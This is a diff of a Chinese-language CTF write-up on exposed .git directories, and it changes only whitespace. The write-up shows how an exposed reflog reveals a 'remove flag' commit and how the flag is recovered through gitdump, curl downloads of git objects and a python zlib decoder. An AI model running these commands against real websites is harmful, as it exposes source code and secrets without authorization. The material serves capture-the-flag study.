@@ -10,12 +10,12 @@
 
 ```mermaid
 flowchart LR
-    A[开发者用 git 管理网站] --> B[.git/ 随网站上传服务器]
-    B --> C[服务器默认允许静态访问 .git/]
-    C --> D[/.git/HEAD 可读]
-    D --> E[.git/logs/HEAD 泄露全部提交历史]
-    E --> F[下载 objects → 还原历史源码]
-    F --> G[删除的 flag 在历史提交里找回]
+ A[开发者用 git 管理网站] --> B[.git/ 随网站上传服务器]
+ B --> C[服务器默认允许静态访问 .git/]
+ C --> D[/.git/HEAD 可读]
+ D --> E[.git/logs/HEAD 泄露全部提交历史]
+ E --> F[下载 objects → 还原历史源码]
+ F --> G[删除的 flag 在历史提交里找回]
 ```
 
 #### git 对象模型（三个核心概念）
@@ -68,9 +68,9 @@ flowchart LR
 gitdump "http://目标/" --out restore
 # [*] 日志: 3 次提交
 # [+] 提交历史:
-#     f9b0dfa  commit (initial): init
-#     3cf883e  commit: add flag      <-- flag 在这里
-#     cfca75b  commit: remove flag
+# f9b0dfa commit (initial): init
+# 3cf883e commit: add flag <-- flag 在这里
+# cfca75b commit: remove flag
 # [+] 恢复文件: 198112555220625.txt ...
 
 # 2. flag 在历史提交里，直接 cat 恢复出的文件
@@ -84,12 +84,12 @@ cat restore/198112555220625.txt
 # 1. 确认存在 + 拿提交历史
 curl -s "http://目标/.git/logs/HEAD"
 # 0000000... f9b0dfa... init
-# f9b0dfa... 3cf883e... add flag    <-- 目标提交
+# f9b0dfa... 3cf883e... add flag <-- 目标提交
 # 3cf883e... cfca75b... remove flag
 
 # 2. 下载 commit 对象（zlib 解压看内容）
 curl -s "http://目标/.git/objects/3c/f883e0167ebbf3f19af04d9704dad1fdbffa5a" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
-# commit 211 tree 2f97c3bf...     <-- 这个 tree 里有 flag
+# commit 211 tree 2f97c3bf... <-- 这个 tree 里有 flag
 
 # 3. 下载 tree（二进制，用 python 解析出 blob sha）
 curl -s "http://目标/.git/objects/2f/97c3bf9455e13f7178d0a815494bbf46922df6" -o tree.bin
